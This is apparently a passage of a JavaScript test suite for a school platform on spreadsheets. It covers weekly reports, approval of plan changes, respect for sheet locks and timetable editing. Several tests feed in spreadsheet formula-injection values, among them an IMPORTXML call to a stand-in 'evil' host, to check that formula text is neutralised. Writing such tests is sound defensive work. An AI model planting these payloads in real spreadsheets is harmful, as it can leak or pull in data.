ok(!vmail.htmlBody.includes('مدارس الأندلس الأهلية') && vmail.htmlBody.includes('مدارس الأندلس العالمية'), "an admin's email covers only their stages");
ok(pmail.htmlBody.includes('<a href="https://control.example.org/"') && pmail.htmlBody.includes('>' + wk.schools.intl.total + '<'), 'it carries the totals and a link to the full report');
ok(hRows().length === 3 && hRows().every(r => r[0] === '2026-11-22') && hRows().find(r => r[1] === EPI)[2] === wk.stages[EPI].total, "the week's numbers are kept, one row per stage");
G('notifyTrigger')();
ok(weeklyMails().length === 2 && hRows().length === 3, 'a second run on the same day sends and records nothing more');
todayIso = '2026-11-23'; mails.length = 0; G('notifyTrigger')();
ok(mails.length === 0, 'on other days no weekly report is sent');

// the next week: something changed
const doneNow = intl.find(p => p.stage === EPI && !p.done && p.c && p.c.done && p.to && p.to < '2026-11-22');
as('vp@school.test', () => G('api_updateExecution')(doneNow.key, JSON.stringify({ done: true })));
todayIso = '2026-11-29'; mails.length = 0;
const wk2 = JSON.parse(as('principal@school.test', () => G('api_weekly')()));
ok(wk2.schools.intl.prev && wk2.schools.intl.prev.date === '2026-11-22' && wk2.schools.intl.counts.done - wk2.schools.intl.prev.done === 1, 'a week later the report compares with the week before');
G('notifyTrigger')();
ok(weeklyMails().length === 2 && /منذ 2026-11-22: مكتمل \+1/.test(weeklyMails()[0].htmlBody) && hRows().length === 6, "the next Sunday's email says what changed since last week");
props.set('WEEKLY', 'off'); todayIso = '2026-12-06'; mails.length = 0; G('notifyTrigger')();
ok(mails.length === 0 && hRows().length === 9, 'with the weekly email switched off nothing is sent, but the numbers are still kept');
throws(() => G('api_saveSettings')(JSON.stringify({ weeklyDay: 9 })), 'INPUT', 'an impossible weekday is refused');
const st3 = JSON.parse(as('vp@school.test', () => G('api_saveSettings')(JSON.stringify({ weekly: true, weeklyDay: 4 })))).settings;
ok(st3.weekly === true && st3.weeklyDay === 4, 'an admin switches the weekly report on and chooses its day');
todayIso = '2026-12-10'; mails.length = 0; G('notifyTrigger')();          // a Thursday
ok(weeklyMails().length === 2, 'and it then goes out on that day');
mails.length = 0;
as('vp@school.test', () => G('api_sendMyWeekly')());
ok(mails.length === 1 && mails[0].to === 'vp@school.test' && mails[0].subject.startsWith('التقرير الأسبوعي'), 'an admin can have the report emailed to themselves at any time');
G('api_saveUser')(JSON.stringify({ email: 'vp@school.test', name: 'VP', role: 'vp', stages: [EPI, MBI], channel: 'off' }));
props.delete('WEEKLY_LAST'); mails.length = 0; G('notifyTrigger')();
ok(weeklyMails().length === 1 && weeklyMails()[0].to === 'principal@school.test', 'an admin who switched messages off gets no weekly email');
ok(post({ fn: 'api_weekly', args: [] }).code === 'AUTH' && post({ fn: 'api_sendMyWeekly', args: [] }).code === 'AUTH', 'the report needs a session on the website too');
props.set('NOTIFY', 'on'); todayIso = '2026-11-15';

// ---- the plan: adding and removing programmes, under the main branch's control ----
const noLimits = () => cache.forEach((v, k) => { if (k.startsWith('rate:')) cache.delete(k); });          // the limits have their own checks
const resync = () => { noLimits(); return G('api_sync')(); };
G('api_saveUser')(JSON.stringify({ email: 'vp@school.test', name: 'VP', role: 'vp', stages: [EPI, MBI] }));
todayIso = '2026-11-15'; resync();
const KP = 'C.Br 3.3', planSheet = main.getSheetByName(fresh().find(p => p.kpi === KP && p.stage === EPI).sheet);
const layout = () => AP.parseSheet(planSheet.name, planSheet.data).tables.filter(t => t.kpi === KP && t.stage === EPI).sort((a, b) => 0)[0];
const colOf = f => layout().cols.find(c => c.field === f).col, cellAt = (r, c) => planSheet.data[r - 1][c - 1];
const nextFree = () => Math.max(...layout().rows) + 1;
const opts = who => { noLimits(); return JSON.parse(as(who, () => G('api_planOptions')(EPI, KP))); };
const vals = (fields, map) => Object.fromEntries(fields.filter(f => map[f.field] !== undefined).map(f => [f.id, map[f.field]]));
const plan = (who, o) => { noLimits(); return as(who, () => JSON.parse(G('api_planRequest')(JSON.stringify(o)))); };
const review = (who, id, dec, note) => as(who, () => JSON.parse(G('api_review')(id, dec, note || '')));
throws(() => opts('exec@school.test'), 'FORBIDDEN', 'teachers cannot add or remove programmes until the admins allow it');
throws(() => as('exec@school.test', () => G('api_saveSettings')(JSON.stringify({ planEdit: true }))), 'FORBIDDEN', 'and a teacher cannot switch that on');
ok(JSON.parse(as('vp@school.test', () => G('api_saveSettings')(JSON.stringify({ planEdit: true })))).settings.planEdit === true, 'an admin allows teachers to request plan changes');
throws(() => as('exec@school.test', () => G('api_planOptions')(EPN, KP)), 'FORBIDDEN', "a teacher cannot open another stage's plan");
const o1 = opts('exec@school.test'), F = o1.tables[0].fields, freeRow = nextFree(), free0 = o1.tables[0].free;
ok(o1.tables[0].open && free0 > 0 && o1.direct === false, 'the plan table reports that it is open and how many free rows the main branch left (' + free0 + ')');
ok(F.find(f => f.field === 'name').required && F.find(f => f.field === 'term').type === 'list' && F.find(f => f.field === 'week').options.includes('الأسبوع 14') && F.find(f => f.field === 'count').type === 'number', 'the form is built from the table itself: name, term and week lists, numbers');
ok(!F.some(f => ['approved', 'techNotes', 'done', 'actual', 'evidence', 'comment'].includes(f.field)), 'it offers only plan columns, never the approval or execution columns');
const good = { name: 'برنامج تجريبي من المعلم', term: 'فصل 1', week: 'الأسبوع 14', count: 25, details: '=IMPORTXML("http://evil","//a")' };
throws(() => plan('exec@school.test', { type: 'add', stage: EPI, kpi: KP, table: 0, values: vals(F, Object.assign({}, good, { name: '' })) }), 'INPUT', 'a programme needs a name');
throws(() => plan('exec@school.test', { type: 'add', stage: EPI, kpi: KP, table: 0, values: vals(F, Object.assign({}, good, { week: 'الأسبوع 99' })) }), 'INPUT', 'a value outside the list is refused');
throws(() => plan('exec@school.test', { type: 'add', stage: EPI, kpi: KP, table: 0, values: vals(F, Object.assign({}, good, { count: -3 })) }), 'INPUT', 'a negative number is refused');
throws(() => plan('exec@school.test', { type: 'add', stage: EPN, kpi: KP, table: 0, values: vals(F, good) }), 'FORBIDDEN', "a teacher cannot add to another stage's plan");
main.getSheets().forEach(sh => { sh.writes = []; });
const q1 = plan('exec@school.test', { type: 'add', stage: EPI, kpi: KP, table: 0, values: vals(F, good), note: 'مبادرة جديدة' });
ok(q1.submission.type === 'add' && q1.submission.status === 'pending' && q1.submission.title === good.name && main.getSheets().every(sh => sh.writes.length === 0), "a teacher's request waits for an admin; nothing is written yet");
ok(JSON.parse(q1.submission.data).show.some(x => x[1] === 'الأسبوع 14') && !('undo' in q1.submission), 'the request keeps what was typed, for the admin to read');
throws(() => as('exec@school.test', () => G('api_review')(q1.submission.id, 'approved', '')), 'FORBIDDEN', 'a teacher cannot approve their own request');
const a1r = review('vp@school.test', q1.submission.id, 'approved');
const rowNow = planSheet.data[freeRow - 1];
ok(a1r.submission.status === 'approved' && rowNow[colOf('name') - 1] === good.name && rowNow[colOf('when') - 1] === 'فصل 1' && rowNow[colOf('when')] === 'الأسبوع 14' && rowNow[colOf('count') - 1] === 25, 'on approval the programme is written into the first free row of the plan');
ok(rowNow[colOf('details') - 1].startsWith("'=") && rowNow[colOf('approved') - 1] === false && planSheet.writes.every(w => w[0] === freeRow && w[1] < colOf('approved')), 'only plan cells of that row are written; formula text is neutralised; the approval box is left to the main branch');
const b1 = JSON.parse(a1r.boot), added = b1.programs.find(p => p.name === good.name && p.stage === EPI);
ok(added && added.kpi === KP && added.row === freeRow && added.from === AP.withDates({ term: 1, week: 14 }, { termStarts: { 1: '2026-08-30' } }).from && a1r.submission.programKey === added.key, 'the platform reads the file again and shows the new programme with its dates');
ok(b1.assign[added.key] && b1.assign[added.key].email === 'exec@school.test', 'the teacher who proposed it becomes the person responsible for it');
ok(opts('exec@school.test').tables[0].free === free0 - 1, 'one free row fewer is left');

// the main branch approves a programme: it is closed
planSheet.data[freeRow - 1][colOf('approved') - 1] = true; resync();
throws(() => plan('exec@school.test', { type: 'remove', programKey: added.key }), 'LOCKED', 'once the main branch has approved a programme, a teacher cannot ask to remove it');
throws(() => plan('vp@school.test', { type: 'remove', programKey: added.key }), 'LOCKED', 'and an admin cannot remove it either');
planSheet.data[freeRow - 1][colOf('approved') - 1] = false; resync();

// the main branch locks the plan: nothing can be added or removed
const lockPlan = { r1: layout().headerRow, r2: layout().end, c1: 1, c2: colOf('approved') - 1 };
planSheet.locks.push(lockPlan);
const oL = opts('exec@school.test');
ok(oL.tables[0].open === false && /مغلق من الفرع الرئيسي/.test(oL.tables[0].reason), 'when the main branch locks the plan, the platform shows it as closed');
throws(() => plan('exec@school.test', { type: 'add', stage: EPI, kpi: KP, table: 0, values: vals(F, Object.assign({}, good, { name: 'أثناء الإغلاق' })) }), 'LOCKED', 'a teacher cannot request an addition while it is closed');
throws(() => plan('vp@school.test', { type: 'add', stage: EPI, kpi: KP, table: 0, values: vals(F, Object.assign({}, good, { name: 'أثناء الإغلاق' })) }), 'LOCKED', 'an admin cannot add while it is closed');
const qr = plan('exec@school.test', { type: 'remove', programKey: added.key, note: 'تكرار' });
ok(qr.submission.type === 'remove' && qr.submission.status === 'pending', 'a teacher asks to remove a programme they are responsible for');
planSheet.writes = [];
throws(() => review('vp@school.test', qr.submission.id, 'approved'), 'LOCKED', 'approving a removal while the main branch has it closed is refused');
ok(planSheet.writes.length === 0 && cellAt(freeRow, colOf('name')) === good.name && JSON.parse(as('vp@school.test', () => G('api_bootstrap')())).submissions.find(x => x.id === qr.submission.id).status === 'pending', 'nothing changes and the request keeps waiting');
planSheet.locks.length = 0;

// removal
throws(() => plan('quran@school.test', { type: 'remove', programKey: added.key }), 'FORBIDDEN', "a teacher cannot ask to remove a colleague's programme");
throws(() => plan('exec@school.test', { type: 'remove', programKey: added.key }), 'STATE', 'one removal request per programme at a time');
const doneP = fresh().find(p => p.stage === EPI && p.done);
throws(() => plan('vp@school.test', { type: 'remove', programKey: doneP.key }), 'STATE', 'a programme with execution data cannot be removed');
planSheet.writes = [];
const rm = review('vp@school.test', qr.submission.id, 'approved');
ok(rm.submission.status === 'approved' && cellAt(freeRow, colOf('name')) === '' && cellAt(freeRow, colOf('when')) === '' && cellAt(freeRow, colOf('approved')) === false && planSheet.writes.every(w => w[0] === freeRow && w[1] < colOf('approved')), "on approval the programme's plan cells are emptied, and nothing else in the row");
ok(!JSON.parse(rm.boot).programs.some(p => p.key === added.key) && opts('exec@school.test').tables[0].free === free0, 'the programme leaves the platform and its row is free again');
const back1 = as('vp@school.test', () => JSON.parse(G('api_reopen')(qr.submission.id)));
ok(back1.submission.status === 'pending' && cellAt(freeRow, colOf('name')) === good.name && cellAt(freeRow, colOf('count')) === 25 && JSON.parse(back1.boot).programs.some(p => p.name === good.name), 'undoing the removal writes the programme back exactly as it was');
review('vp@school.test', qr.submission.id, 'returned', 'يبقى البرنامج');

// an admin's own change is carried out at once, and can be undone
const d1 = plan('vp@school.test', { type: 'add', stage: EPI, kpi: KP, table: 0, values: vals(F, { name: 'برنامج من الإدارة', term: 'فصل 2', week: 'الأسبوع 3' }) });
const adminRow = nextFree() - 1;
ok(d1.submission.status === 'approved' && d1.submission.reviewedBy === 'vp@school.test' && cellAt(adminRow, colOf('name')) === 'برنامج من الإدارة' && JSON.parse(d1.boot).programs.some(p => p.name === 'برنامج من الإدارة'), "an admin's addition is written at once");
ok(!JSON.parse(d1.boot).assign[d1.submission.programKey], 'and assigns no one by itself');
const un1 = as('vp@school.test', () => JSON.parse(G('api_reopen')(d1.submission.id)));
ok(un1.submission.status === 'pending' && cellAt(adminRow, colOf('name')) === '' && !JSON.parse(un1.boot).programs.some(p => p.name === 'برنامج من الإدارة'), 'undoing an addition empties the row again');
as('vp@school.test', () => G('api_withdraw')(d1.submission.id));

// what the platform never overwrites
planSheet.formulas[nextFree() + ',' + colOf('count')] = '=SUM(A1:A2)';
planSheet.rules[nextFree() + ',' + colOf('item')] = ['مسابقة', 'نادٍ', 'رحلة'];
const o2 = opts('vp@school.test').tables[0].fields;
ok(!o2.some(f => f.field === 'count') && o2.find(f => f.field === 'item').type === 'list' && o2.find(f => f.field === 'item').options.join() === 'مسابقة,نادٍ,رحلة', "a calculated cell is not offered, and a cell with a list offers the main file's own choices");
throws(() => plan('vp@school.test', { type: 'add', stage: EPI, kpi: KP, table: 0, values: vals(o2, { name: 'س', term: 'فصل 1', week: 'الأسبوع 2', item: 'غير موجود' }) }), 'INPUT', "a choice that is not in the main file's list is refused");
const fRow = nextFree();
const d2 = plan('vp@school.test', { type: 'add', stage: EPI, kpi: KP, table: 0, values: Object.assign(vals(o2, { name: 'برنامج بقائمة', term: 'فصل 1', week: 'الأسبوع 2', item: 'رحلة' }), { ['c' + colOf('count')]: 77, ['c' + colOf('approved')]: true, ['c' + colOf('done')]: true }) });
ok(cellAt(fRow, colOf('item')) === 'رحلة' && cellAt(fRow, colOf('count')) === '' && cellAt(fRow, colOf('approved')) === false && cellAt(fRow, colOf('done')) !== true, 'values sent for a calculated cell, the approval box or an execution column are ignored');
delete planSheet.formulas[fRow + ',' + colOf('count')]; delete planSheet.rules[fRow + ',' + colOf('item')];

// a table with no free row, and the master switches
const fullT = AP.parseSheet(main.getSheetByName(fresh().find(p => p.kpi === 'A.Br 1.2' && p.stage === MBI).sheet).name, main.getSheetByName(fresh().find(p => p.kpi === 'A.Br 1.2' && p.stage === MBI).sheet).data);
const oFull = JSON.parse(as('vp@school.test', () => G('api_planOptions')(MBI, 'A.Br 1.2'))).tables[0];
ok(oFull.free === 0 && oFull.open === false && /لا يوجد صف فارغ/.test(oFull.reason), 'a table with no free row says so');
throws(() => plan('vp@school.test', { type: 'add', stage: MBI, kpi: 'A.Br 1.2', table: 0, values: { c6: 'x' } }), 'FULL', 'and nothing can be added to it; rows are never inserted');
G('api_saveSettings')(JSON.stringify({ writeBack: false }));
throws(() => plan('vp@school.test', { type: 'add', stage: EPI, kpi: KP, table: 0, values: vals(F, { name: 'والكتابة متوقفة', term: 'فصل 1', week: 'الأسبوع 5' }) }), 'SETUP', 'with writing to the main file switched off, an admin cannot change the plan');
ok(control.getSheetByName('Submissions').data.filter(r => r[9] === 'والكتابة متوقفة').length === 0, 'and no half-made request is left behind');
G('api_saveSettings')(JSON.stringify({ writeBack: true, planEdit: false }));
throws(() => plan('exec@school.test', { type: 'remove', programKey: added.key }), 'FORBIDDEN', 'when the admins switch plan requests off, teachers can no longer send them');
ok(JSON.parse(as('vp@school.test', () => G('api_planOptions')(EPI, KP))).direct === true, 'admins keep their own control');
ok(post({ fn: 'api_planOptions', args: [EPI, KP] }).code === 'AUTH' && post({ fn: 'api_planRequest', args: ['{}'] }).code === 'AUTH', 'plan changes need a session on the website too');
ok(JSON.parse(G('api_audit')(200)).some(x => x.action === 'plan-request') && JSON.parse(G('api_audit')(200)).some(x => x.action === 'review-approved' && /"type":"add"/.test(x.details)), 'every request and decision is recorded in the activity log');

// ---- the site follows the main branch's permissions on the main file ----
G('api_saveSettings')(JSON.stringify({ writeBack: true, planEdit: true }));
planSheet.locks.length = 0; resync();
const seen = () => JSON.parse(as('vp@school.test', () => G('api_bootstrap')()));
const inTable = () => seen().programs.filter(p => p.kpi === KP && p.stage === EPI);
ok(inTable().length > 0 && inTable().every(p => !p.planClosed && !p.execClosed) && seen().plan[KP + '|' + EPI].state === 'open' && seen().plan[KP + '|' + EPI].free > 0, 'with nothing locked, the site shows the plan as open and counts its free rows');
ok(seen().plan['A.Br 1.2|' + MBI].state === 'full' && seen().plan['A.Br 1.2|' + MBI].free === 0 && !Object.keys(seen().plan).some(k => k.endsWith(EPN)), 'a table with no free row is shown as full; an admin sees only their own stages');
// the main branch locks the plan part of the table
const L = layout(), planLock = { r1: L.headerRow + 1, r2: L.end, c1: 1, c2: colOf('approved') - 1 };
planSheet.locks.push(planLock); resync();
ok(inTable().every(p => p.planClosed === true && !p.execClosed) && seen().plan[KP + '|' + EPI].state === 'closed' && seen().plan[KP + '|' + EPI].free === 0, 'after the main branch locks the plan, the next sync marks every programme of that table closed for planning, and the table as closed');
ok(seen().programs.filter(p => p.kpi !== KP).every(p => !p.planClosed), 'other tables are unaffected');
const openExec = inTable().find(p => !p.done && p.c.done);
ok(as('vp@school.test', () => JSON.parse(G('api_updateExecution')(openExec.key, JSON.stringify({ done: true })))).ok === true, 'execution data can still be written, because the main branch left it open');
as('vp@school.test', () => G('api_updateExecution')(openExec.key, JSON.stringify({ done: false })));
planSheet.locks.length = 0;
// the main branch locks the execution columns of one programme
const one = inTable().find(p => !p.done && p.c.done && p.c.evidence);
planSheet.locks.push({ r1: one.row, r2: one.row, c1: one.c.done, c2: one.c.comment || one.c.evidence }); resync();
ok(inTable().find(p => p.key === one.key).execClosed === true && inTable().filter(p => p.execClosed).length === 1 && !inTable().find(p => p.key === one.key).planClosed, "locking one programme's execution cells closes execution for that programme only");
planSheet.writes = [];
throws(() => as('vp@school.test', () => G('api_updateExecution')(one.key, JSON.stringify({ done: true }))), 'LOCKED', 'an admin cannot edit execution data the main branch has closed');
ok(planSheet.writes.length === 0, 'and nothing is written');
G('api_saveUser')(JSON.stringify({ email: 'exec@school.test', name: 'Exec', role: 'teacher', stages: [EPI], aliases: ['وليد يوسف'] }));
const rp = as('exec@school.test', () => JSON.parse(G('api_submit')(JSON.stringify({ type: 'report', programKey: one.key, outcome: 'done', actual: 12 }))));
const rvL = review('vp@school.test', rp.id, 'approved');
ok(rvL.submission.status === 'approved' && /مغلقة من الفرع الرئيسي/.test(rvL.submission.writeback) && planSheet.writes.length === 0, 'approving a report is recorded, but says it was not written because the main branch has closed the execution data');
planSheet.locks.length = 0;
// protections that close nothing
planSheet.locks.push({ r1: L.headerRow, r2: L.end, c1: 1, c2: 30, warn: true }, { r1: L.headerRow, r2: L.end, c1: 1, c2: 30, mine: true }); resync();
ok(inTable().every(p => !p.planClosed && !p.execClosed) && seen().plan[KP + '|' + EPI].state === 'open', 'a protection that only warns, or one this account may edit, closes nothing');
planSheet.locks.length = 0;
// the whole sheet protected, with the execution columns left open
planSheet.lockAll = { open: [{ r1: 1, r2: 5000, c1: colOf('done'), c2: 40 }] }; resync();
ok(inTable().every(p => p.planClosed === true && !p.execClosed) && seen().plan[KP + '|' + EPI].state === 'closed', 'when the main branch protects the whole sheet and leaves only execution open, the site follows exactly that');
throws(() => plan('vp@school.test', { type: 'add', stage: EPI, kpi: KP, table: 0, values: vals(F, { name: 'x', term: 'فصل 1', week: 'الأسبوع 2' }) }), 'LOCKED', 'so nothing can be added');
ok(as('vp@school.test', () => JSON.parse(G('api_updateExecution')(openExec.key, JSON.stringify({ done: true })))).ok === true, 'while execution data is still written');
as('vp@school.test', () => G('api_updateExecution')(openExec.key, JSON.stringify({ done: false })));
planSheet.lockAll = null; resync();
ok(inTable().every(p => !p.planClosed) && seen().plan[KP + '|' + EPI].state === 'open', 'when the main branch opens it again, the next sync opens it in the site');

// ---- the school's sessions schedule: Sunday to Thursday, eight sessions a day, times set by the admins ----
const TT = control.getSheetByName('Timetable'), ttRows = () => TT.data.slice(1).filter(r => r[0]);
const lesson = (who, o) => { noLimits(); return as(who, () => JSON.parse(G('api_saveLesson')(JSON.stringify(o)))); };
const table = who => JSON.parse(as(who, () => G('api_timetable')()));
const LS1 = { stage: EPI, klass: '5A', weekday: 0, period: 1, subject: 'English', teacher: 'exec@school.test', room: 'R12' };
ok(!!TT && ttRows().length === 0 && TT.formats.some(f => f[4] === '@'), 'setup creates the Timetable tab, as plain text');
const t0 = table('vp@school.test');
ok(t0.days === 5 && t0.perDay === 8 && t0.periods[EPI].length === 8 && t0.periods[EPI][0].join() === '07:30,08:15' && Object.keys(t0.periods).sort().join() === [EPI, MBI].sort().join(), 'the schedule has five days and eight sessions a day, with starting times for each stage the admin covers');
throws(() => lesson('exec@school.test', LS1), 'FORBIDDEN', 'a teacher cannot change the school schedule');
throws(() => lesson('vp@school.test', Object.assign({}, LS1, { stage: EPN })), 'FORBIDDEN', "an admin cannot change another stage's schedule");
throws(() => lesson('vp@school.test', Object.assign({}, LS1, { klass: '' })), 'INPUT', 'a session needs a class');
throws(() => lesson('vp@school.test', Object.assign({}, LS1, { subject: '' })), 'INPUT', 'a session needs a subject');
throws(() => lesson('vp@school.test', Object.assign({}, LS1, { weekday: 5 })), 'INPUT', 'Friday is not a school day');
throws(() => lesson('vp@school.test', Object.assign({}, LS1, { weekday: 6 })), 'INPUT', 'nor is Saturday');
throws(() => lesson('vp@school.test', Object.assign({}, LS1, { period: 9 })), 'INPUT', 'there is no ninth session');
throws(() => lesson('vp@school.test', Object.assign({}, LS1, { period: 0 })), 'INPUT', 'a session needs its number');
G('api_saveUser')(JSON.stringify({ email: 'mbi@school.test', name: 'Middle Teacher', role: 'teacher', stages: [MBI] }));
throws(() => lesson('vp@school.test', Object.assign({}, LS1, { teacher: 'mbi@school.test' })), 'INPUT', 'the teacher must belong to the stage');
const ls1 = lesson('vp@school.test', LS1);
ok(ls1.lesson.id && ls1.lesson.period === 1 && ls1.lesson.teacherName === 'Exec' && ls1.lesson.teacher === 'exec@school.test' && ls1.warnings.length === 0 && ttRows().length === 1 && ttRows()[0][4] === 1, 'an admin puts a session in a day and session number');
throws(() => lesson('vp@school.test', { stage: EPI, klass: '5A', weekday: 0, period: 1, subject: 'Maths' }), 'STATE', 'a class has one session in each slot: a second one is refused');
const ls2 = lesson('vp@school.test', { stage: EPI, klass: '5A', weekday: 0, period: 2, subject: 'Maths', teacherName: 'خالد العتيبي', room: '=cmd' });
ok(ls2.warnings.length === 0 && ls2.lesson.teacherName === 'خالد العتيبي' && ls2.lesson.teacher === '' && ls2.lesson.room.startsWith("'="), 'a typed teacher name is kept; formula text is neutralised');
const ls3 = lesson('vp@school.test', { stage: EPI, klass: '6B', weekday: 0, period: 1, subject: 'Reading', teacherName: 'Exec' });
ok(ls3.lesson.teacher === 'exec@school.test' && ls3.warnings.length === 1 && /للمعلم Exec حصة أخرى/.test(ls3.warnings[0]), 'a typed name that matches one member of staff is linked to them, and a teacher in two classes at once is flagged');
const ls2b = lesson('vp@school.test', Object.assign({}, ls2.lesson, { period: 3 }));
ok(ls2b.lesson.id === ls2.lesson.id && ls2b.lesson.period === 3 && ttRows().length === 3, 'moving a session to another slot keeps one row');
throws(() => lesson('vp@school.test', Object.assign({}, ls2b.lesson, { period: 1 })), 'STATE', 'a session cannot be moved onto another one');
throws(() => lesson('principal@school.test', Object.assign({}, ls2.lesson, { id: 'nope' })), 'GONE', 'an unknown session cannot be changed');
const ttv = table('exec@school.test');
ok(ttv.lessons.length === 3 && ttv.lessons.filter(x => x.mine).length === 2 && ttv.lessons.every(x => !('teacher' in x)) && !JSON.stringify(ttv).includes('@school.test') && Object.keys(ttv.periods).join() === EPI, 'a teacher sees the schedule and times of their stage with their own sessions marked, and no addresses');
ok(table('mbi@school.test').lessons.length === 0 && table('vp@school.test').lessons[0].teacher === 'exec@school.test', 'another stage sees nothing of it; admins get the staff link');

// the admins set the session times, and change them
const times = (who, o) => { noLimits(); return as(who, () => JSON.parse(G('api_savePeriods')(JSON.stringify(o)))); };
const NEWT = [['07:00', '07:45'], ['07:45', '08:30'], ['08:30', '09:15'], ['09:35', '10:20'], ['10:20', '11:05'], ['11:05', '11:50'], ['12:10', '12:55'], ['12:55', '13:40']];
throws(() => times('exec@school.test', { stage: EPI, periods: NEWT }), 'FORBIDDEN', 'a teacher cannot change the session times');
throws(() => times('vp@school.test', { stage: EPN, periods: NEWT }), 'FORBIDDEN', "an admin cannot change another stage's times");
throws(() => times('vp@school.test', { stage: EPI, periods: NEWT.slice(0, 7) }), 'INPUT', 'all eight sessions need a time');
throws(() => times('vp@school.test', { stage: EPI, periods: NEWT.map((x, i) => i === 2 ? ['09:00', '08:40'] : x) }), 'INPUT', 'a session cannot end before it starts');
throws(() => times('vp@school.test', { stage: EPI, periods: NEWT.map((x, i) => i === 3 ? ['09:00', '09:45'] : x) }), 'INPUT', 'a session cannot start before the one before it ends');
throws(() => times('vp@school.test', { stage: EPI, periods: NEWT.map((x, i) => i === 0 ? ['7 صباحاً', '07:45'] : x) }), 'INPUT', 'something that is not a time is refused');
const tm = times('vp@school.test', { stage: EPI, periods: NEWT.map((x, i) => i === 0 ? ['٧:٠٠', '7.45'] : x) });
ok(tm.periods[EPI][0].join() === '07:00,07:45' && tm.before[EPI][0].join() === '07:30,08:15' && table('exec@school.test').periods[EPI][7].join() === '12:55,13:40', 'an admin sets the times of the eight sessions, and everyone in the stage sees them');
ok(table('vp@school.test').periods[MBI][0].join() === '07:30,08:15' && table('exec@school.test').lessons.find(x => x.id === ls1.lesson.id).period === 1, 'another stage keeps its own times, and sessions stay in their slots: only the clock changed');
times('vp@school.test', { stages: [EPI, MBI], periods: NEWT });
ok(table('vp@school.test').periods[MBI][3].join() === '09:35,10:20', 'the same times can be given to several stages at once');
times('vp@school.test', { stage: EPI, periods: tm.before[EPI] });
ok(table('vp@school.test').periods[EPI][0].join() === '07:30,08:15' && JSON.parse(G('api_audit')(20)).some(x => x.action === 'session-times'), 'the times can be changed back, and each change is in the activity log');

// pasting a whole table: class, day, session number, subject, teacher, room
const paste = (who, stage, rows) => { noLimits(); return as(who, () => JSON.parse(G('api_importLessons')(JSON.stringify({ stage, rows })))); };
throws(() => paste('exec@school.test', EPI, [['5A', 'الأحد', '4', 'علوم']]), 'FORBIDDEN', 'a teacher cannot paste a schedule');
const badp = paste('vp@school.test', MBI, [['الصف', 'اليوم', 'الحصة', 'المادة', 'المعلم', 'القاعة'], ['7A', 'الأحد', '١', 'علوم', 'Middle Teacher', 'مختبر'], ['7A', 'الجمعة', '2', 'رياضيات'], [], ['7A', 'الاثنين', '9', 'لغتي'], ['7A', 'الأحد', '1', 'فنية']]);
ok(badp.ok === false && badp.wrong === 3 && badp.errors.map(e => e.line).join() === '3,5,6' && ttRows().length === 3, 'a pasted table with a weekend day, a ninth session or two sessions in one slot adds nothing and lists the lines');
const okp = paste('vp@school.test', MBI, [['الصف', 'اليوم', 'الحصة', 'المادة', 'المعلم', 'القاعة'], ['7A', 'الأحد', '١', 'علوم', 'Middle Teacher', 'مختبر'], ['7A', 'Monday', 'الحصة 2', 'رياضيات', 'سعد'], ['7B', '3', '8', 'لغتي', '', '']]);
ok(okp.ok && okp.added === 3 && ttRows().length === 6 && okp.lessons[0].weekday === 0 && okp.lessons[0].period === 1 && okp.lessons[0].teacher === 'mbi@school.test' && okp.lessons[1].weekday === 1 && okp.lessons[1].period === 2 && okp.lessons[2].weekday === 2 && okp.lessons[2].period === 8, 'a pasted table is read with Arabic or English day names, Arabic digits and a heading line, and teachers are linked by name');
ok(paste('vp@school.test', MBI, [['7A', 'الأحد', '1', 'مكرر']]).ok === false, 'pasting onto a slot the class already has is refused');
throws(() => as('principal@school.test', () => G('api_undoImport')(okp.undoId)), 'GONE', "one admin cannot undo another admin's paste");
ok(JSON.parse(as('vp@school.test', () => G('api_undoImport')(okp.undoId))).ids.length === 3 && ttRows().length === 3, 'undoing a paste removes exactly the sessions it added');
throws(() => as('vp@school.test', () => G('api_undoImport')(okp.undoId)), 'GONE', 'an undo works once');
throws(() => paste('vp@school.test', MBI, Array.from({ length: 601 }, () => ['7A', 'الأحد', '1', 'x'])), 'INPUT', 'more than 600 rows at once is refused');
// clearing a class, deleting one session
throws(() => as('exec@school.test', () => G('api_clearClass')(EPI, '5A')), 'FORBIDDEN', "a teacher cannot clear a class's schedule");
noLimits();
const clr = JSON.parse(as('vp@school.test', () => G('api_clearClass')(EPI, '5A')));
ok(clr.removed.length === 2 && ttRows().length === 1 && ttRows()[0][2] === '6B', "clearing a class removes that class's sessions only, and returns them");
throws(() => as('exec@school.test', () => G('api_deleteLesson')(ls3.lesson.id)), 'FORBIDDEN', 'a teacher cannot delete a session');
noLimits(); as('vp@school.test', () => G('api_deleteLesson')(ls3.lesson.id));
ok(ttRows().length === 0, 'an admin deletes a session');
ok(post({ fn: 'api_timetable', args: [] }).code === 'AUTH' && post({ fn: 'api_saveLesson', args: ['{}'] }).code === 'AUTH' && post({ fn: 'api_importLessons', args: ['{}'] }).code === 'AUTH' && post({ fn: 'api_savePeriods', args: ['{}'] }).code === 'AUTH', 'the schedule needs a session on the website too');
// ---- the schedule builder: a setup kept for each stage, a built schedule applied and undone ----
const Solver = require('../src/solver.js');
const PL = control.getSheetByName('Planner'), plRows = kind => PL.data.slice(1).filter(r => r[0] && (!kind || r[1] === kind));
const planner = who => JSON.parse(as(who, () => G('api_planner')()));
const savePl = (who, stage, setup, base) => { noLimits(); return as(who, () => JSON.parse(G('api_savePlanner')(JSON.stringify({ stage, setup, base })))); };
const execName = JSON.parse(G('api_users')()).find(x => x.email === 'exec@school.test').name;
const SETUP = { dayLen: [8, 8, 8, 8, 7], classes: ['5A', '5B', '5A', ' '], subjects: ['Maths', 'English', '=SUM(1)'],
  teachers: [{ id: 't1', name: 'ignored', email: 'exec@school.test', subjects: ['English', 'Nope'], quota: 20 }, { id: 't2', name: 'سعد', subjects: ['Maths'], quota: 99, maxDay: 5 }, { id: 't3', name: 'Outsider', email: 'someone@else.test' }, { id: 't1', name: 'dup' }],
  loads: [{ klass: '5A', subject: 'Maths', count: 5, teacher: 't2' }, { klass: '5A', subject: 'English', count: 5, teacher: 't1' }, { klass: '5B', subject: 'Maths', count: 5, teacher: 'gone' }, { klass: '9Z', subject: 'Maths', count: 5 }, { klass: '5A', subject: 'Maths', count: 2 }],
  rules: [{ id: 'r1', type: 'off', must: true, teacher: 't2', days: [0, 0, 9], from: 8, to: 6 }, { id: 'r2', type: 'window', must: false, subject: 'Maths', from: 1, to: 5 }, { id: 'r3', type: 'hack', n: 1 },
    { id: 'r4', type: 'off', teacher: 'gone' }, { id: 'r5', type: 'fixed', klass: '', day: 2, period: 8, label: 'نشاط' }, { id: 'r6', type: 'together', subject: 'Nope', n: 1 }] };
